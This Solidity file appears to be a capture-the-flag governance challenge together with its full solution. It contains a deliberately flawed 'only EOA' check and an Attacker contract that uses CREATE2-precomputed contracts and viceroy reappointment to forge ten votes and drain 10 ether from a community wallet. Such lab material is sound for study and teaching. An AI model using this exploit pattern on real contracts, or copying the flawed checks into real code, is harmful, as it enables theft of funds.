// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Test, console} from "forge-std/Test.sol";

contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    function _beforeTokenTransfer(address from, address, uint256, uint256) internal pure {
        require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    }
}

contract Governance {
    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;

    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    struct Appointment {
        uint256 appointedBy;
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
    * @dev an oligarch can appoint a viceroy if they have an NFT
    * @param viceroy: the address who will be able to appoint voters
    * @param id: the NFT of the oligarch
    */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter"); // viceroy approved by
        require(!alreadyVoted[msg.sender], "Already voted");

        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        console.log("proposal", proposal); // 20951231332519530260451331881527447272654800164248699379398565663309763569704
        console.log("votes", proposals[proposal].votes); // 10
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res,) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res,) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}

contract Attacker {
    CreateViceroyFactory private factory;
    Viceroy private viceroy1;
    Viceroy private viceroy2;

    address private governance;

    uint256 constant ETH_AMOUNT = 10 ether;
    uint256 constant SALT1 = 1;
    uint256 constant SALT2 = 2;
    bytes PROPOSAL = abi.encodeWithSignature("exec(address,bytes,uint256)", address(this), "", ETH_AMOUNT);

    constructor() {
        factory = new CreateViceroyFactory();
    }

    receive() external payable {}

    function init(address _governance) external {
        governance = _governance;
    }

    function attack() external {
        bytes memory bytecode = factory.getBytecode(governance, PROPOSAL);
        address viceroyAddress1 = factory.getAddress(bytecode, SALT1);
        Governance(governance).appointViceroy(viceroyAddress1, 1);
        viceroy1 = factory.deploy(SALT1, governance, PROPOSAL);
        viceroy1.attack(1);
        attack2();

        Governance(governance).executeProposal(uint256(keccak256(PROPOSAL)));
    }

    function attack2() private {
        bytes memory bytecode = factory.getBytecode(governance, PROPOSAL);
        address viceroyAddress2 = factory.getAddress(bytecode, SALT2);
        Governance(governance).deposeViceroy(address(viceroy1), 1);
        Governance(governance).appointViceroy(viceroyAddress2, 1);
        viceroy2 = factory.deploy(SALT2, governance, PROPOSAL);
        viceroy2.attack(4);
    }
}

contract Viceroy {
    CreateVoterFactory private factory;
    Voter[] private voters;

    address public governance;
    bytes public proposal;

    constructor(address _governance, bytes memory _proposal) {
        factory = new CreateVoterFactory();
        governance = _governance;
        proposal = _proposal;
    }

    function attack(uint256 _startSalt) external {
        uint256 proposalId = uint256(keccak256(proposal));

        for (uint256 i = _startSalt; i <= _startSalt + 4; i++) {
            address voterAddress = getVoterAddress(i, proposalId);
            Governance(governance).approveVoter(voterAddress);

            Voter newVoter = factory.deploy(i, governance, proposalId, address(this));
            voters.push(newVoter);
        }
        vote();
    }

    function getVoterAddress(uint256 _salt, uint256 proposalId) private view returns (address voterAddress) {
        bytes memory bytecode = factory.getBytecode(governance, proposalId, address(this));
        voterAddress = factory.getAddress(bytecode, _salt);
    }

    function vote() private {
        Governance(governance).createProposal(address(this), proposal);
        for (uint256 i = 0; i < voters.length; i++) {
            voters[i].vote();
        }
    }
}

contract Voter {
    address public governance;
    uint256 public proposalId;
    address public viceroy;

    constructor(address _governance, uint256 _proposalId, address _viceroy) {
        governance = _governance;
        proposalId = _proposalId;
        viceroy = _viceroy;
    }

    function vote() external {
        Governance(governance).voteOnProposal(proposalId, true, viceroy);
    }
}

contract CreateViceroyFactory {
    function deploy(uint256 _salt, address _governance, bytes memory _proposal) external returns (Viceroy viceroy) {
        viceroy = new Viceroy{salt: bytes32(_salt)}(_governance, _proposal);
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }

    function getBytecode(address _governance, bytes memory _proposal) public pure returns (bytes memory) {
        bytes memory bytecode = type(Viceroy).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_governance, _proposal));
    }
}

contract CreateVoterFactory {
    function deploy(uint256 _salt, address _governance, uint256 _proposalId, address _viceroy)
        external
        returns (Voter voter)
    {
        voter = new Voter{salt: bytes32(_salt)}(_governance, _proposalId, _viceroy);
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }

    function getBytecode(address _governance, uint256 _proposalId, address _viceroy)
        public
        pure
        returns (bytes memory)
    {
        bytes memory bytecode = type(Voter).creationCode;
        return abi.encodePacked(bytecode, abi.encode(_governance, _proposalId, _viceroy));
    }
}
